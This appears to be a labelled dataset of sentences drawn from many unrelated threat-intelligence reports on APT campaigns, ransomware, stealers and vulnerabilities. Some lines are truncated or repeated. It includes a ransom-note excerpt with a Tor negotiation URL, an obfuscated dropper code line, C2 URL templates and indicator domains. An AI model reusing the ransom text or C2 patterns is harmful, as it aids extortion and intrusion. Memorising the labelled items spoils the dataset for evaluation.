0	As of February 6th, Adobe has patched the issue in version 28.0.0.161, see: [APSB18-03](https://helpx.adobe.com/security/products/flash-player/apsb18-03.html).
0	This post provides an overview of the vulnerability, a walk-through of the exploit seen in the wild, and covers several detection mechanisms.
0	Upon closer inspection and monitoring this website over a period of time, we uncovered the following new TTPs.
0	Updating download links
0	This app store is used as a gateway to redirect the users to attacker-registered domains hosting the backdoored versions of Kavach application.
0	To understand this better, we took snapshot of this website at different points of time in 2022
0	A similar persistence mechanism was used by another tool in SideCopy APT's arsenal in 2021.
0	DUSSEN field contains a hex-encoded version of the string - "india".
0	The fields - DBTABLES, DBTABLES_INDEXES and SYNC_RULES_CONFIG all correspond to the structure and configuration of the tables in the local SQLite database.
0	Figure 10: Contents of a database from an infected VM
0	These drawing file extensions correspond to "AutoCAD" or computer-aided design vector files.
0	Below are the main steps in network communication of LimePad.
0	Below is a brief description of the different stages of network requests.
0	As we indicated earlier, we are still investigating this case.
0	We obtained the list of all the infected machines registered with the attackers server.
0	Figure 12 below shows a preview of the latest information.
0	On execution, the binary performs following operations:
0	Performs the time zone check and executes further only if the time zone matches Indian Standard Time (IST).
0	The installer is extracted from the resource section of the binary.
0	Stage-2: PyInstaller compiled binary
0	The Stage-2 payload is a Python script compiled to an executable using PyInstaller.
0	For analysis we extracted the Python script which we have included in the Appendix section.
0	The script on execution does following major operations:
0	Taking snapshots
0	Creating persistence
0	Exfiltrating user and system information
0	One of the key targets of APT-36 is the Indian government and it targets the government users with various Kavach related themes including credential harvesting attacks.
0	Figure 14: Open directory on the server hosting the Kavach phishing page
0	The image file - kavach.jpg in the above open directory stood out based on the file creation date.
0	We pivoted on this image files hash, and observed that the same image was also referenced from kavach-app[.]com (a domain which we previously attributed to APT-36 group).
0	Zscaler detection status
0	This report was intended to shed light on one of several C&C frameworks that criminals are using.
0	DeimosC2 is one of the alternative tools that SOC teams will likely see being used against their networks for post-compromise activities.
0	A recently developed malware framework called Elephant is being delivered in targeted spear phishing campaigns using spoofed Ukrainian governmental email addresses.
0	The four malware components delivered are used for stealing credentials, documents, and to provide remote access to the infected machine.
0	Two of these components were first reported on by the Computer Emergency Response Team for Ukraine (CERT-UA) in March 2022.
0	They named the two components GraphSteel and GrimPlant.
0	When investigating these events, we have identified that Elephant has also been delivered via phishing emails from spoofed Ukrainian email addresses.
0	Elephant is a malware framework written in Go.
0	The activity has been attributed to UAC-0056 (TA471, SaintBear, UNC2589) by CERT-UA.
0	On March 12, the CERT-UA published an alert on a threat about phishing emails sent on behalf of state bodies of Ukraine that urged the recievers to update the system by using a link provided in the email.
0	On March 15, SentinelOne found two more samples of the GraphSteel and GrimPlant malware families.
0	The subject of the email and the file name are both Wage arrear.
0	We reported the issue to CERT-UA.
0	The code snippet below shows a reconstruction of the source code tree, bold indicating folders, showing how the different components have been organized.
0	The downloader acts as an orchestrator for the other components.
0	All the 3rd party libraries are listed in the code snippet below.
0	These are all libraries to facilitate lateral movement.
0	It is not clear if these are left-overs from an older version of the malware or hints of future functionality.
0	The code snippet shows parts of the root certificate information.
0	There are only a handful of gRPC methods supported by the malware.
0	The client component is a credential and file stealer.
0	The oldest certificate we discovered had a validity date of not before December 9th, 2021.
0	We dont know if the decision to name it Elephant is a nod to Babar, an espionage software attributed to a French intelligence agency, or intended as a false flag.
0	UAC-0056 (TA471, SaintBear, UNC2589) started using a new malware framework called Elephant back in December 2021.
0	The malware has been delivered in targeted spear phishing campaigns using spoofed Ukrainian governmental email addresses.
0	Nicole is a malware analyst and reverse engineer.
0	Prior to Intezer she was an embedded researcher in the Israel Defense Forces (IDF) Intelligence Corps.
0	An overview of a bulletproof hosting provider named ELITETEAM.Introduction: What is Bulletproof Hosting (BPH)?Bulletproof hosting (BPH) is a type of service offered by hosting providers that allows operators unrestricted and unregulated use of their paid infrastructure.
0	Usually, these providers ignore abuse complaints, giving threat actors an ideal platform to conduct various malicious activities.
0	The observed victims were dispersed globally, with the highest concentrations in Brazil, India, and South Africa, based on IP geo-location data.Finally, a third Bitbucket account (named mrssoprano666) was identified, again associated with 185.215.113.92.Figure 9: mrssoprano666 Bitbucket AccountIn this case, we pay witness to a potential career change.
0	We identified a user called mrssoprano666 on an underground Russian-language forum, offering physical services associated with fraudulent activity.
0	Use the CRI to assess your organizations preparedness against attacks, and get a snapshot of cyber risk across organizations globally.Content added to FolioAPT & Targeted AttacksWhile tracking the activities of the SideWinder group, we identified a server used to deliver a malicious LNK file and host multiple credential phishing pages.
0	In addition, we also found multiple Android APK files on their phishing server.By: Joseph C Chen, Jaromir Horejsi, Ecular Xu
0	Save to FolioWhile tracking the activities of the SideWinder group, which has become infamous for targeting the South Asia region and its surrounding countries, we identified a server used to deliver a malicious LNK file and host multiple credential phishing pages.
0	We learned that these pages were copied from their victims webmail login pages and subsequently modified for phishing.
0	We believe further activities are propagated via spear-phishing attacks.The groups targets include multiple government and military units, mainly in Nepal and Afghanistan.
0	After the gathered credentials are sent, some of the phishing pages will redirect victims to different documents or news pages.
0	The themes and topics of these pages and documents are related to either Covid-19 or recent territory disputes between Nepal, Pakistan, India, and China.
0	Since the end of April 2022, we have observed new malicious spam campaigns spreading a previously unknown malware family called SVCReady.
0	The malware is notable for the unusual way it is delivered to target PCs  using shellcode hidden in the properties of Microsoft Office documents  and because it is likely in an early stage of development, given that its authors updated the malware several times in May.
0	In this report, we share a closer look at the infection chain of the new SVCReady campaigns, the malwares features, its changes over time, and possible links with TA551.
0	Figure 1  SVCReady sample isolated by HP Wolf Security in April 2022.
0	Infection Chain
0	Based on HP Wolf Security telemetry, the first sighting of this new campaign was on 22 April 2022.
0	Figure 2  Document properties containing shellcode, namely a series of nop instructions as represented by 0x90 values.
0	VBA Macro and Shellcode
0	Figure 3  Windows API function definitions.
0	Figure 4  Loading shellcode into a variable.
0	A detection opportunity here is to alert on the execution of Windows owned binaries outside their standard directories.
0	However, we have seen one other campaign that used this technique in mid-April to distribute Ursnif.
0	The Downloader
0	The malware collects system information including the username, computer name, time zone and whether the computer is joined to a domain.
0	Interestingly, RC4 encryption was not implemented in the first malware samples we analyzed at the end of April 2022.
0	Figure 9  The RC4 key used to encrypt the malwares network communication, shown in memory.
0	This, as well as the low frequency and volume of the campaigns, suggests that the malware is in the early stages of development.
0	This stage is called checkvm.
0	These status messages are always in JSON format.
0	Once the persistence phase is completed, another information gathering phase follows.
0	The information collected is identical to that gathered in the earlier information gathering phase.
0	Virtual Machine Detection
0	This post will discuss the solution to the specific technical challenges we faced when analyzing the malware described in the blog Fake Hungarian Government Email Drops Warzone RAT.
0	To circumvent this problem, we created standalone executables from the various stages to enable more efficient debugging.
0	This is what we are going to discuss in this post.
0	Problem statement
0	But before we can do that, we face the following challenges:
0	How do we run theKeysNormalize.dllindependently of the executable that originally unpacks and runs it in memory?
0	The reason to add this to the code is that we cant add a breakpoint in advance in the debugger.
0	This way, we can break execution while the program waits for a keypress and then add breakpoints wherever needed.
0	Figure 4 - Reference to the DLL is added to the project
0	Warning: if you run this program, you are executing the malicious payload, so only run it on an isolated, safe system.
0	This is not as simple as it seems.
0	So the namespace must be BattleshipLiteLibrary.
0	The reason we went through all this trouble to get KeysNormalize.dll running is to efficiently debug it and dump the next stage.
0	This can be done in dnspy.
0	ConfigurationInside SugarLocker, 22 detailed options are stored as follows.
0	The hex value of the data combining all three values below is generated as an uppercase MD5 hash, and the first 12 digits of these are used as the ID value of the infected device.
0	Each key backs up the following data.
0	-data parameter or file encryption key delivered to a specific file is extracted and used, and the extraction process is as follows.
0	ID: 12-digit infected device ID (ID3)TICK: System tick count (GetTickCount)RAN: Random number (Random in Delphi using LCG)GEN: Cryptographically random numbers ( CryptGenRandom)COUNT: Performance Counter ( QueryPerformanceCounter) + Current timeCURSOR: Y-axis and X-axis of the current mouse cursorTIME: Current time(network mode)
0	TokenVirtualizationEnabledDisable UAC virtualization by setting the TokenVirtualizationEnabled value of the current token to 0.3.
0	The difference is from 8.
0	Referencehttps://medium.com/walmartglobaltech/sugar-ransomware-a-new-raas-a5d94d58d9fbhttps://id-ransomware.blogspot.com/2021/11/encoded01-ransomware.htmlAppendix A.SugarLockers SHA256 hashes and configurationhttps://docs.google.com/spreadsheets/d/1er3vNUYAWR60f_OL67ewJloYVGkWHNYMTESlhDawXS4/edit#gid=0Appendix B.SugarLocker Negotiation Page
0	Homepage: https://s2w.incFacebook: https://www.facebook.com/S2WLABTwitter: https://twitter.com/S2W_Official
0	(Is the recruitment not going well?)
0	And now he seems to be focusing on Android and NFT rather than RaaS.
0	!-----------------------------------------------------------------------------------------Your ID:[Custom encoded infected device information]Your support onion(TOR) url:http://chat5sqrnzqewampznybomgn4hf2m53tybkarxk4sfaktwt7oqpkcvyd.onion/gate.php?data=[Custom encoded infected device information]
0	!ONE MORE TIME: Its in your interests to get your files back.
0	From our side, we (the best specialists) make everything for restoring, but please should not interfere.!!!
0	In addition, an option to perform encryption only for specific file extensions when generating ransomware is included.
0	The default value is *.
0	List excluded from encryption for each encryption target path.
0	This is distinct from other ransomware that provides up to 1 or 2 file encryption modes, with each mode providing different encryption strength and speed.
0	Also, according to each mode, the encryption key is generated in 7.
0	Download the Tor browser to access the negotiation site.
0	Execute ransom noteThe desktop path is collected in the same way as the 12.
0	That is our guarantee.If you will not cooperate with our service - for us, its does not matter.
0	But you will lose your time and data, cause just we have the private key.
0	In this method (Figure 2), also known as Process Isolation or Windows Process Container, the kernel is shared with the host and the container works as a single job.
0	Currently, this method isolation can be enabled only on Windows Servers, but it should also be available from Windows 11.
0	All the marked processes are under one Job (Silo object).
0	To use it through Docker, you need to specify isolation process like that:
0	For example, when someone is running docker exec from outside the container, what happens behind the scenes?
0	This is an open-source by Microsoft that was created as an interface for using the Windows Host Compute Service (HCS), Windows service named vmcompute.exe (Hyper-V Host Compute Service), to launch and manage Windows containers (Figure 4).
0	Lets look at the simple example of creating a new container in Windows.
0	Figure 4  Windows Containers Architecture (taken from this blog)
0	I decided to go with the first one, because this method offered a better chance to learn more about how things work between the Docker Daemon to the container.
0	The first step was to learn about the architecture, which can expose more attack vectors as you get a better understanding of how it works.
0	I decided to go with the first one, because this method offered a better chance to learn more about how things work between the Docker Daemon to the container.
0	Therefore, from within the container, we cant use them.
0	There is not much information about CExecSvc, but you can read about it in the last Windows Internals book 7, part 1 (page 190):
0	Procedures            : {CExecCreateProcess, CExecResizeConsole, CExecSignalProcess, CExecShutdownSystem}
0	We see it has four functions, and from their names, you can understand what they are doing.
0	At this point, we know that these two services, HCS and CExecSvc, have their own RPC server that expose functions.
0	Lets understand how they work together.
0	For example, you can see in the figure below (Figure 13) a call to the UUID of CExecSvc.
0	To make a long story short, it didnt work  but I do want to share my research process around it.
0	If I am able to do it, I will access the containers and maybe even escalate my privileges.
0	Unknown Nation-Based Threat Actor Using Android RAT to Target Indian Defence Personnel
0	The CYFIRMA research team recently detected a malicious android APK targeting Indian Defence Personnel.
0	Further as shown below, the IP is associated with other malicious APKs, HTML, and URLs.
0	On clicking the App, it opens a google drive link using the web view module which leads to a letter related to the promotion of defense personnel in pdf format as shown below.
0	Details as below.
0	CYFIRMA Research team performed a code review of the malicious APK file.
0	MD5: 8A5C06AE6FD206CEF418BE4B21180F41SHA1:
0	In late August 2020, we published an overview of DeathStalkers profile and malicious activities, including their Janicab, Evilnum and PowerSing campaigns (PowerPepper was later documented in 2020).
0	Notably, we exposed why we believe the threat actor may fit a group of mercenaries, offering hack-for-hire services, or acting as an information broker to support competitive and financial intelligence efforts.
0	Meanwhile, in August 2020, we also released a private report on VileRAT to our threat intelligence customers for the first time.
0	VileRAT is a Python implant, part of an evasive and highly intricate attack campaign against foreign exchange and cryptocurrency trading companies.
0	In July 2022, we also noticed that the attackers leveraged chatbots that are embedded in targeted companies public websites to send malicious DOCX to their targets.
0	Malicious DOCX social engineering message
0	The DOCX documents are frequently named using the compliance or complaint keywords (as well as the name of the targeted company), suggesting the attacker is answering an identification request or expressing an issue as a reason to send them.
0	VileRAT infection and toolset overview
0	A bit of stomping and concealment up to VileDropper
0	In this last case, DeathStalker ensured it would result in a popup message to the user (see Figure 4).
0	But most of all, DeathStalker ensured that it distributed several variants of infection documents to their targets, each one being prepared for a specific Office version.
0	End Function
0	Leveraging Office object properties as hidden data sources is also something we have previously seen with PowerPepper.
0	TextBox form used as a data store within malicious DOTM documents, as shown by Microsofts VBA editor
0	var _0x527036 = _0x112a30 + '\x5c' + WScript[_0x1dbcbb(0x38c)](0x1),//ACCS3_0x33ee6e =
0	VileDropper code excerpt in its original form
0	if (!sArgThird1) {}
0	Deobfuscated execution check in VileDropper
0	During execution VileDropper:
0	JSON Key
0	Content (JSON value)
0	A target identifier.
0	Due to fixed lengths and padding from the identifier generation logic, the identifiers final form is always 48 characters long.
0	All values that are colored in red are now chosen at random from a h
0	AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36Host: corstand[.]com
0	Language: en-US,en;q=0.8Accept: */*Referer: http://www.yahoo.comCookie: source=<encrypted blob>;User-Agent: Mozilla/5.0 (WindowsNT 10.0; Win64; x64)
0	12345678
0	GET /administrator/index.php HTTP/1.1Connection: keep-AliveAccept-
0	In recent samples, developers tried to improve these evasion techniques, and the HTTP request now looks like this:
0	VileLoader used the targeted systems uptime as a source of randomness.
0	Later, VileLoader and VileRAT use other variants of this algorithm, which produces data blobs that are laid out as one of the following options:
0	Type B:[XOR key length (variable)][XOR key (random bytes)][Padding][XOR-encoded data]
0	[XOR-encoded data length][XOR-encoded data][XOR key length (variable)][XOR key (random bytes)]
0	[XOR-encoded data length][XOR-encoded data][XOR key length (variable)][XOR key (random bytes)]
0	This unpacker stage is aimed at decoding, loading, and executing the second stage in memory.
0	The command line must include five arguments at least, or VileLoader terminates the execution.
0	In practice, VileDropper usually gives seven arguments to VileLoader, as we have previously described.
0	Stage 2  In-memory downloader
0	In older VileLoader samples, the downloader used a static URL that looked as follows:
0	http://<domain>/c&v=2&u=<argument 1>&a=<argument 2>&c=<argument 3>
0	http://<domain>/c&v=2&u=<argument 1>&a=<argument 2>&c=<argument 3>
0	The only evasion attempt consisted in randomly choosing an HTTP User-Agent header value amongst a fixed list of four.
0	Pierre Delcher
0	DEEPSoft digital certificate
0	Activity involving toolsets authored by WingEggDrop and signed with both legitimate and fake certificates has been previously reported on by AhnLab.
0	The main dumper used by the threat actor utilized open source projects to load an SSP to LSASS and then dump the process.
0	Loader Analysis
0	The loader appears to be taken from an open source project available on GitHub.
0	The dump will be created in the following path:
0	This is done utilizing the MiniDumpWriteDump API.
0	SSP Analysis
0	Like many components utilized by WIP19, all their credential harvesting tools  consisting mainly of password dumpers  were signed using the DEEPSoft certificate.
0	The keylogging and screen recording components
0	Its commonly understood that malware created by WinEggDrop is shared among several threat clusters, making it possible that these associated toolsets could also be in use by the WIP19 threat actor.
0	DEEPSoft digital certificate
0	Activity involving toolsets authored by WingEggDrop and signed with both legitimate and fake certificates has been previously reported on by AhnLab.
0	Dumper Analysis
0	Credential dumper loader 2eeb46d538c486f8591a78a65dde250b0bf62f89 Windows domain tool
0	Screen Recording
0	A relatively unique TTP observed in this activity is the recording of the users screen.
0	Much like keylogging, this helps the actor harvest credentials and access sensitive information.
0	This indicates that some of the intrusions are well researched and highly targeted.
0	This provided us a foundation from which to investigate further.
0	SolarWinds Orion is used to monitor and manage on-premise and hosted infrastructures.
0	Instead, additional investigation is needed into whether the SolarWinds Orion device engaged in further unexplained communications.
0	This negates any future use of the implants and would have caused communications with this domain to cease.
0	[3] This technique negates many common defensive capabilities in detecting the activity.
0	Note: CISA has not yet been able to independently confirm the adversarys use of this technique.According to FireEye, the malware also checks for a list of hard-coded IPv4 and IPv6 addressesincluding RFC-reserved IPv4 and IPv6 IPin an attempt to detect if the malware is executed in an analysis environment (e.g., a malware analysis sandbox); if so, the malware will stop further execution.
0	(888)282-0870Send us emailDownload PGP/GPG keysSubmit website feedbackReceive security alerts, tips, and other updates.CISA is part of the Department of Homeland Security
0	File Name(s):CORE-2019.4.5220.20574-SolarWinds-Core-v2019.4.5220-Hotfix5.mspNew January 6, 2021Sunburst Backdoorhttps://otx.alienvault.com/pulse/5fd6df943558e0b56eaf3da8New January 6, 2021SSL hash for 107.152.35[.]77https://otx.alienvault.com/pulse/5fd6df943558e0b56eaf3da8New January 6, 2021Resolves to infinitysoftwares[.]comResolves to ervsystem[.]comUpdated January 7, 2021: Corrected typo in resolves to domainNew January 6, 2021Updated January 7, 2021: updated reference and sourceNew January 7, 2021This product is provided subject to this Notification and this Privacy & Use policy.Please share your thoughts.We recently updated our anonymous product survey; we'd welcome your feedback.\
0	This will frustrate commonly used detection techniques in many environments.
0	Since valid, but unauthorized, security tokens and accounts are utilized, detecting this activity will require the maturity to identify actions that are outside of a users normal duties.
0	For example, it is unlikely that an account associated with the HR department would need to access the cyber threat intelligence database.Taken together, these observed techniques indicate an adversary who is skilled, stealthy with operational security, and is willing to expend significant resources to maintain covert presence.
0	(Updated January 6, 2021): The adversary has been observed using multiple persistence mechanisms across a variety of intrusions.
0	Note: implementing this detection opportunity can result in false positives if legitimate users apply virtual private network (VPN) solutions before connecting into networks.The following conditions may indicate adversary activity.
0	(New December 21, 2020): see the National Security Agency (NSA) Cybersecurity Advisory: Detecting Abuse of Authentication Mechanisms for additional detection methods as well as mitigation recommendations.Due to the nature of this pattern of adversary activityand the targeting of key personnel, incident response staff, and IT email accountsdiscussion of findings and mitigations should be considered very sensitive, and should be protected by operational security measures.
0	This module was compiled 2020-09-16 14:16:21 and detected in early December 2020, having a similar timeline to the 3Proxy tool deployment.
0	This DTrack module is very similar to the EventTracKer module of DTrack, which was previously reported to our Threat Intelligence customers.
0	In one victim system, we discovered that a well-known simple HTTP server, HFS7, had deployed the malware above.
0	We saw Andariel abuse identical exploits and compromise WebLogic servers in mid-2019, and previously reported this activity to our Threat Intelligence customers.
0	Victims
0	The July 2022 CISA alert noted that the healthcare and public health sectors had been targeted with the Maui ransomware within the US.
0	However, based on our research, we believe this operation does not target specific industries and that its reach is global.
0	We can confirm that the Japanese housing company was targeted with the Maui ransomware on April 15, 2021.
0	Also, victims from India, Vietnam, and Russia were infected within a similar timeframe by the same DTrack malware as used in the Japanese Maui incident: from the end of 2020 to early 2021.
0	Cyble Research Labs has been actively monitoring the attack surface via our sensors since the day the Log4Shell vulnerability was first reported.
0	So far, weve seen a significant increase on a daily basis, with Threat Actors targeting servers that use the vulnerable Log4J library.
0	Thus, its safe to say that the end users devices are not impacted at this moment.
0	As per our analysis, no Apple products appear to be affected by this vulnerability  unless they run on a server which uses a vulnerable Log4J library.
0	This normally refers to serialized Java objects, but there is also a JNDI Reference mechanism that allows indirect factory building.
0	Cause of Vulnerability
0	A JNDI reference is written to a log, which retrievesthe variables criteria.It also downloadsand runsany remote classes that are necessary to finish the process.
0	Proof of Concept (PoC)Validation
0	After triggering theexploit,we observedthatthecodewasexecutedsuccessfully as shown inthebelow figure.
0	Cybleis a global threat intelligence SaaS provider that helps enterprises protect themselves from cybercrimes and exposure in theDarkweb.
0	Figure 1 shows the Chrome extension.
0	In the technical analysis, we will cover three browser hijackers that mainly target Chromium-based browsers.
0	All the extensions that we found were present on the Chrome web store.
0	A browser hijacker is an unwanted program that modifies browser settings without user permission and redirects them to specific web pages that they do not intend to visit.
0	Browser Extensions Capture User Searches For Monetary GainDuring a routine investigation, Cyble Research and Intelligence Labs (CRIL) discovered multiple Chrome extensions that compromised over two million users with Browser Hijackers.
0	These JSON files contain over 1,000 domains in total, and we observed that a few of them were also legitimate sites.
0	Thus, this extension might display warning messages for legitimate sites as well.
0	Additionally, a part of the code suggests that the developer of this extension may have contributed to the STOPPROPAGANDA campaign, indicating that the author of this extension might be redirecting more traffic to Russian government sites.
0	Hijacker Plugin 2:
0	The figure below shows these redirects.
0	Figure 7  Opens New Tabs
0	This browser plugin is used to run an ad campaign.
0	Figure 8 shows the Chrome extension with over a million installs.
0	The meta information of the plugin is given below:
0	Verify the authenticity of sources before installing browser add-ons such as validating developer, domain, and user reviews.
0	We have been monitoring a wave of spear-phishing attacks targeting the government, academic, foundations, and research sectors around the world.
0	Based on the lure documents we observed in the wild, this is a large-scale cyberespionage campaign that began around March.
0	After months of tracking, the seemingly wide outbreak of targeted attacks includes but not limited toMyanmar, Australia, the Philippines, Japan and Taiwan.
0	We analyzed the malware families used in this campaign and attributed the incidents to a notorious advanced persistent threat (APT) group called Earth Preta (also known as Mustang Panda and Bronze President).
0	In this blog entry, we discuss Earth Pretas new campaign and its tactics, techniques, and procedures (TTPs), including new installers and backdoors.
0	Apart from the government offices with collaborative work in Myanmar, subsequent victims included the education and research industries, among others.
0	In addition to decoy topics covering ongoing international events concerning specific organizations, the attackers also lure individuals with subject headings pertaining to pornographic materials.
0	Figure 2.Distribution of Earth Pretas targeted industries Analyzing the routines
0	Earth Preta attack campaign routine from March to October 2022
0	Earth Preta uses spear-phishing emails as its first step for intrusion.
0	As aforementioned, some of the emails subjects and contents discuss geopolitical topics, while others might contain sensational subjects.
0	The email's subject might be empty or might have the same name as the malicious archive.
0	The full command line is as follows.
0	Files in the archive of Type B
0	Notably, the names of the lure documents and executables can be different, as detailed in the next sections.
0	Type C: Fake file extensions
0	In this case, China VS Taiwan.rar contains several files, including:
0	China VS Taiwan.rar
0	First-stage legitimate executable for DLL
0	In this campaign, we identified the following malware used, namely PUBLOAD, TONEINS, and TONESHELL.
0	This malware was first disclosed by Cisco Talos in May 2022.
0	We observed several leveraged APIs including GrayStringW, EnumDateFormatsA, and LineDDA, and can be considered as a technique to bypass antivirus monitoring and detection.
0	The following data is collected from the victim's machine:
0	The body is also encrypted in RC4, and the command codes are much like Variant B as follows:
0	Command codes in TONESHELL variant C
0	Threat hunting
0	Figure 11.An example of shellcode callback in PUBLOAD
0	APIs that accept a callback function
0	As of this writing, all the stagers we have seen so far share the same key.
0	The RC4 key used (top) and the packet body in PUBLOAD malware (bottom)
0	Request packet format in PUBLOAD
0	After US House Speaker Nancy Pelosis visit to Taiwan in August, we found an archive file named ".rar" (translated as The public opinion summary of Pelosi's visit to Taiwan) in Traditional Chinese, but we could only get one of the malicious DLLs inside the archive file.
0	Based on our observations, the file names for the dropped TONESHELL malware differ in case, and so do the names of the scheduled tasks.
0	AttributionThe observed TTPs in this campaign ar
0	If we hunt for this specific email address in the monitoring logs, we might find more distributed malware.
0	For example, after our investigation, we know that the actors abused the same email address to store the lure archives in Google Drive, as well as deliver the phishing email.
0	The file owner's name and email addressWe can conduct further research with this specific email account.
0	Files with fake file extensions
0	Anti-Analysis: Process name check
0	In this sample, the exception handler is located at the offset 0x10005300.
0	In addition, as an anti-sandbox and delayed execution technique, the malicious routine can only be triggered if the foreground window has already been switched for the fifth time.
0	The main malicious routine in the exception handler
0	Figure 21.GetForegroundWindow check in newer TONESHELL samples
0	We also noticed that its internal strings are self-explanatory.
0	An example of the 32-byte key (top) and the TONESHELL shellcode before decoding (middle) and after decoding (bottom)
0	Shellcode decoding
0	After the malicious exception handler is triggered, it starts to decode the next-stage TONESHELL shellcode.
0	TwoPipeShell Write File
0	Command codes in TONESHELL variant A
0	The command codes in this variant are as follows:
0	Command codes in TONESHELL Variant B
0	Example of a Google Drive link, found in the wild, containing both TONESHELL and TONEINS
0	Here we see the URL extracted from the Office document, the hash for the RTF file that got downloaded and then the link to the original file.
0	Going back to our search in InQuest Labs we can find the matching hash value:
0	Another thing we can see is this was ingested from MalwareBazaar.
0	The recent Microsoft Exchange Server zero-day exploits (CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, CVE-2021-27065) have seen tens of thousands of organizations compromised by HAFNIUM and numerous other threat actor groups.
0	Working closely with our customers across the globe, we have quickly been able to identify and isolate attributes of those attacks  particularly the China Chopper web shell being uploaded to compromised Microsoft Exchange servers with a publicly facing Internet Information Services (IIS) web server.
0	The China Chopper server-side ASPX web shell is extremely small and typically, the entire thing is just one line.
0	Here is our example payload, which starts a command prompt and pings itself.
0	Figure 3 - Custom Script Execution
0	Figure 4 - Virtual Terminal
0	All this is made available just from the one line of code running on the server.
0	The following code is the request which was sent:
0	In this method, we can see a strong resemblance to the ASPX China Chopper web shell in a compiled C# .NET assembly format.
0	This is what is served to a user when the page is requested.
0	Several vulnerabilities for Java Spring framework have been disclosed in the last hours and classified as similar as the vulnerability that caused the Log4Shell incident at the end of 2021.
0	However, as of the publishing of this report, the still ongoing disclosures and events on these vulnerabilities suggest they are not as severe as their predecessor.
0	The ASEC analysis team discovered that the Word document type identified in the blog, Malicious Word Files Targeting Specific Individuals Related to North Korea, has recently been using FTP to leak user credentials.
0	The filename of the identified Word document is CNA[Q].doc, disguised as a CNA Singaporean TV program interview.
0	The file is password-protected and is deemed to be distributed as an attachment in emails alongside the password.
0	Password-protected Word file
0	Word file content
0	The features of each file are as follows.
0	The upload addresses for each file are as follows.
0	Media & Press Releases
0	May 4, 2020
0	Authors
0	During our research on the Winnti group we discovered a considerable amount of Winnti samples targeting different gaming companies.
0	1st attempt: virtual machine #1
0	MS Word (.doc, .docx) documents
0	At the beginning of the investigation we ran the malicious programs on a virtual machine, which worked fairly well  we even spotted some cybercriminal activity.
0	(ff._exe_, MD5: 0xd2d6115a337cf4f40402d15cb9ece2ea, verdict: Trojan.Win32.KillWin.sp)
0	(ec.exe, MD5: 0x14c112794ca492b7a82fa11f94b5b8b3, verdict: Trojan-PSW.Win32.Certif.a)
0	Sequence of events:
0	After that it would have raised suspicions if the state of the virtual machine had been rolled back and it was infected all over again.
0	This was all that was of any interest on my virtual machine.
0	After that, we didnt risk using any more virtual machines it could frighten off the cybercriminals.
0	Therefore, we decided to continue our observations in a more realistic environment.
0	3rd attempt: the Marta trap
0	I had arranged the local network to look like a department at a certain gaming company.
0	We had to wait for a while before we noticed in the network traffic that someone was active on the infected machine.
0	Thats why we made up several correspondents for Marta to communicate with: a team lead, system administrator, manager and engineers.
0	Apparently at this moment the intruders decided to take a break and think over what to do next, since they stopped their reconnaissance and only returned several hours later.
0	They examined the content of the current users documents folder:
0	Try #1
0	The first time the attackers were just getting the lay of the land, observing what was happening on the desktop of the infected computer
0	Nothing new was displayed.
0	Judging by the results of our observation we can assume that the members of the Winnti group dont bother with complicated work and tend to grab low-hanging fruits.
0	This was also noticed when the group was trying to penetrate one gaming company for a second time.
0	No doubt they wanted to re-infect the company it was notable that they were persistent but used fairly crude approaches, only rarely using more sophisticated methods.
0	This may have worked if the company in question hadnt been prepared for such attacks, but we were waiting for them and their numerous direct attacks failed.
0	In the end they just gave up and, as was the case earlier, they most probably postponed their next attempt for a month or so, possibly switching to another more susceptible victim.
0	Considering how many companies they have already compromised, there is hardly a lack of potential victims.
0	They appear not to waste much time on particularly hard targets, opting instead to make money from the numerous organizations that require less effort to crack.
0	FortiGuard LabsThreat Analysis Report: This blog originally appeared on the enSilo website and is republished here for threat research purposes.enSilo wasacquiredby Fortinet in October 2019.
0	Summary
0	The discovered variants are previously unknown and deploy malware that is unique to the threat actor.
0	These malware families have a rich history of being used in numerous targeted attacks against government and private organizations.
0	The activity surfaced in Southeast Asia, a region where APT10 frequently operates.
0	Overview
0	Although they deliver different payloads to a victim's machine, both variants drop the following files beforehand: jjs.exe - legitimate executable, jli.dll - malicious DLL, msvcrt100.dll - legitimate Microsoft C Runtime DLL, svchost.bin - binary file
0	jjs.exe is a JVM-based implementation of a javascript engine that is part of the Java platform developed by Oracle, but in this case it served as a loader for the malware.
0	PlugX is a modular structured malware that has many different operational plugins, such as communication compression and encryption, network enumeration, files interaction, remote shell operations, and more.
0	The method is known as DLL Side-Loading.
0	The decryption process resembles previous versions used by the group in PlugX\RedLeaves.
0	Figure 1: Decryption of the binary file
0	The first variant uses a service as its persistence method.
0	The complete execution flow is visualized in Figure 2, below.
0	Figure 2: Loaders execution flow
0	The reflective load code is obfuscated, as function calls are made by dynamically resolving their addresses according to hashed values.
0	Modified Quasar RAT
0	Among the different samples we tested, we encountered the following service names being registered: WxUpdateServiceInfo, HxUpdateServiceInfo, WinDefendSec, Web_Client, clr_optimization_v4.0.30319_31, clr_optimization_v4.0.30319_37
0	Whilewininet!InternetOpenW(the Unicode version of the function) is used, an ascii value is provided as the User-Agent, so instead of RookIE/1.0, the request headers will include inconsistent and meaningless values, as can be seen in Figure 3.
0	In our analysis, the conhost.exe that was downloaded is itself another downloader written in .NET and disguised as a legitimate system executable.
0	The downloaded payload is a modified Quasar RAT.
0	This version contains the addition ofSharpSploitto extract passwords from a victims machine using the frameworks built-in mimikatz capabilities.
0	The sample in the first loader communicates withupdate[.]microsofts[.]orgwith DNS over TCP.
0	The sample in the second loader communicates withupdate[.]kaspresksy[.]comover HTTPS.
0	All of the overlaps in the network infrastructure make it very reasonable to assume that thesame group is operating both variants.
0	HawkEye keylogger is an info-stealing malware that is mainly distributed via spam mails.
0	Spam mail found in February 2021
0	[File Detection] Trojan/Win.Kryptik.R371540 ( 2021.03.12.02)
0	It offers visitors an update to Flash Player.
0	GitHub disabled this repository on February 14 after we reported it to them.
0	Solutions for:Learn MoreLearn MoreLearn MoreLearn MoreLearn MoreLearn MoreLearn MoreLearn MoreLearn MoreLearn MoreLearn MoreLearn MoreLearn MoreLearn MoreLearn MoreLearn MoreLearn MoreLearn MoreLearn MoreLearn MoreLearn MoreLearn MoreLearn MoreThreatsThreatsCategoriesCategoriesOther sections
0	ID is the MD5 hash of the base64-encoded MAC address of the first connected network adapter, while TripleDES in ECB mode is used as an encryption algorithm.
0	https://root20system20macosxdriver.serveusers[.]com/yW6jOyQM16rj.html
0	DE2D8AF2EFED0C145690B2F13CD063B3
0	About UsCybleis a global threat intelligenceSaaSprovider that helps enterprises protect themselves from cybercrimes and exposure in theDarkweb.
